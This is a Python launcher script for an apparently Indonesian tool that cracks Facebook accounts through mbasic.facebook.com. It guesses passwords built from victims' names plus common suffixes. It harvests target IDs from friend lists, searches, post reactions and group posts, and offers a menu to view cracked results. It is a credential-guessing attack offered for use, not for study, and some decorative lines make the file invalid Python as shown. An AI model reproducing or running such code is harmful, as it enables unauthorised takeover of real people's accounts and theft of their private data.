#!/usr/bin/python3
# coding=utf-8

•••••••••••••••••••••••••••••••••••••••
              go.py
  author: Yudhaha
  Ig    : https://instagram.com/yudamxr?igshid=oz075ik01ree
  fb    : https://www.facebook.com/damar.ky.16
  wa bot: Wa.me//+17145921008
•••••••••••••••••••••••••••••••••••••••

from src.store import Store
from src.BFF import BFF
from src.http import Http
from src.data.login import Login
from src.data.crack import crack
from src.data.brute import Brute

store = Store()

🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻
>                          INFORMATION                            <
>                                                                 <
🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺🔺
# akan menghasilkan pw: nama_depan123, nama_belakang12345
# nama_tengah123, nama_tengah12345
# dan seterusnya
store.passwordNameList = ['123', '12345']
# contoh penggunaan store.passwordExtraList = ['kenwe', 'kentod', 'dll']
# catatan: semakin banyak password semakin lama proses crakingnya.
store.passwordExtraList = []
# lower password
store.passwordLower = True
# base url
store.setBaseURL('https://mbasic.facebook.com{0}')
# login class
store.setLoginClass(Login)
# http requests classs
store.setHttpClass(Http)

crack = crack(store)
bff = BFF(store)
brute = Brute(store)

store.add({
    'name': 'Start crack',
    'func': brute.main,
})
store.add({
    'name': 'crack daftar teman',
    'func': crack.friendsList,
})
store.add({
    'name': 'crack publik',
    'func': crack.publicID,
})
store.add({
    'name': 'crack pencarian nama',
    'func': crack.search,
})
store.add({
    'name': 'Dump id dari reaction post',
    'func': crack.react,
})
store.add({
    'name': 'crack postingan group',
    'func': crack.postGroup,
})
store.add({
    'name': 'Hapus hasil dump',
    'func': bff.clearcrackCache,
})
store.add({
    'name': 'Lihat hasil crack',
    'func': bff.resultCrack,
})
store.add({
    'name': 'Ganti akun',
    'func': bff.changeAccount,
})

bff.run()